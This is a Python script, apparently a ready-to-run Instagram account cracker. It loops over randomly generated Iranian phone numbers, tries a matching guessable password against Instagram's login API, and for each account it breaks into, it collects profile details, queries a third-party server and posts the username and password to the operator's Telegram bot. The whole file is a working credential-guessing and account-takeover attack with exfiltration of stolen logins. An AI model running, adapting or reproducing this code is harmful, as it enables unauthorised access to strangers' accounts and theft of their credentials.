import os
import pyfiglet
os.system('clear')
try:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
    ss = 0
    E = '\x1b[1;31m'
    G = '\x1b[1;32m'
    S = '\x1b[1;33m'
    V = '\033[1;90m'
    F = "\033[1;92m"
    I = '\x1b[2;33m'
    R = "\033[1;91m"
    J = '\033[1;94m'
    i = "\033[1;90m"
    K = "\033[1;94m"
    Z = '\033[1;31m' #احمر
    X = '\033[1;33m' #اصفر
    Z1 = '\033[2;31m' #احمر ثاني
    F = '\033[2;32m' #اخضر
    A = '\033[2;34m'#ازرق
    C = '\033[2;35m' #وردي
    B = '\033[2;36m'#سمائي
    Y = '\033[1;34m' #ازرق فاتح
    import time
    timee = time.asctime()
    t = time.localtime()
    import webbrowser
    webbrowser.open('http/t.me/C2C_C')
    current_time = time.strftime('%H:%M:%S', t)
    print (f"""

  {C}██{E}╗{C}███{E}╗   {C}██{E}╗{C}███████{E}╗{C}████████{E}╗ {C}█████{E}╗ 
  {C}██{E}║{C}████{E}╗  {C}██{E}║{C}██{E}╔════╝╚══{C}██{E}╔══╝{C}██{E}╔══{C}██{E}╗
  {C}██{E}║{C}██{E}╔{C}██{E}╗ {C}██{E}║{C}███████{E}╗   {C}██{E}║   {C}███████{E}║
  {C}██{E}║{C}██{E}║╚{C}██{E}╗{C}██{E}║╚════{C}██{E}║   {C}██{E}║   {C}██{E}╔══{C}██{E}║
  {C}██{E}║{C}██{E}║ ╚{C}████{E}║{C}███████{E}║   {C}██{E}║   {C}██{E}║  {C}██{E}║
  {E}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝{A}                                                                                        """)
    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.1)            
    a(Z+' [⌯] Enter TOKEN ')
    print ("""
""")
    tok = input (X+"     >> "+I)
    os.system('clear')
    a(Z+' Enter ID ')
    print ("""
""")
    ID = input (X+"     >> "+I)
    sleep(0.1)
    os.system('clear')    
    start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌗ KAKASHI @v6v_v").json()
    id_msg = start_msg['result']['message_id']

    def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name    = str(req_id['graphql']['user']['full_name'])
        id    = str(req_id['graphql']['user']['id'])
        followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following    = str(req_id['graphql']['user']['edge_follow']['count'])
        isp    = str(req_id['graphql']['user']['is_private'])       
        bio    = str(req_id['graphql']['user']['biography'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}") 
        ree = re.json()
        dat = ree['data']
        t = time.localtime()
        current_time = time.strftime('%H:%M:%S', t)
        joo3 = (f""" 
        
𝗡𝗘𝗪 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗜𝗠 𝗞𝗔𝗞𝗔𝗦𝗛𝗜
= = = = = = = = = = = = = = =
⌯ 𝙽𝙰𝙼𝙴 : {name}
⌯ 𝚄𝚂𝙴𝚁 : {userQ}
⌯ 𝙿𝙰𝚂𝚂 : {password}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂: {followes}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 : {following}
⌯ 𝙳𝙰𝚃𝙰 : {dat}
⌯ 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {isp} 
⌯ 𝙱𝙸𝙾  : {bio} 
= = = = = = = = = = = = = = =
⌯ 𝒇𝒓𝒐𝒎 : @C2C_C """)
        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
        i = requests.post(tlg)
        print(G + joo3)        
    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing',  'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
    v6v_v = '0987654321'
    while True:
        us = str(''.join((random.choice(v6v_v) for i in range(7))))
        username = '+98936' + us
        password = '0936' + us
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():     
            print(f" {R} ({F}{username}{R}) : {R}({F}{username}{R})")
            print(R+"-----------------------------------")
            print(f""" ({F}-{R}) {F}Hit  {R}  : {F}{zz} 
 {R}({J}-{R}) {J}Bad  {R}  : {J}{aa}
 {R}({i}-{R}) {i}Error  {R}: {i}{ss}  """)
            print(R+"-----------------------------------")
            ss+=1
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=⌯ Hi New KAKASHI \n .- - - - - - - - - - - - .\n⌯ Bad [{aa}] \n⌯ Don [{zz}]\n⌯ Secure [{ss}] \n⌯ in User [{username}]\n. - - - - - - - - - - - - - .\n ⌯ Tele : @C2C_C")                     
            os.system('cls' if os.name == 'nt' else 'clear')
            print("""
\033[1;31m ------------------------
\033[2;34m < COD BY KAKASHI - SENSEI >
\033[1;33m ------------------------
\033[1;31m _  __    _    _  __    _    ____  _   _ ___ 
\033[1;31m| |/ /   / \  | |/ /   / \  / ___|| | | |_ _|
\033[1;33m| ' /   / _ \ | ' /   / _ \ \___ \| |_| || | 
\033[1;31m| . \  / ___ \| . \  / ___ \ ___) |  _  || | 
\033[1;33m|_|\_\/_/   \_\_|\_\/_/   \_\____/|_| |_|___|
          \033[1;31m ____  _____ _   _ ____  _____ ___ 
         \033[1;33m / ___|| ____| \ | / ___|| ____|_ _|
         \033[1;31m \___ \|  _| |  \| \___ \|  _|  | | 
         \033[1;33m ___) | |___| |\  |___) | |___ | | 
         \033[1;31m |____/|_____|_| \_|____/|_____|___|
\033[2;34m--------------------------------------------------
\033[1;31m
 Telegram   : https://t.me/v6v_v 
 Insta      : 2.lw2
\033[1;33m
--------------------------------------------------
""" )            
            print(f" {R}({F}{username}{R}) : {R}({F}{password}{R})")
            print(R+"-----------------------------------")
            print(f""" ({F}-{R}) {F}Hit  {R}  : {F}{zz} 
 {R}({J}-{R}) {J}Bad  {R}  : {J}{aa}
 {R}({i}-{R}) {i}Error  {R}: {i}{ss}  """)
            print(R+"-----------------------------------")
            aa += 1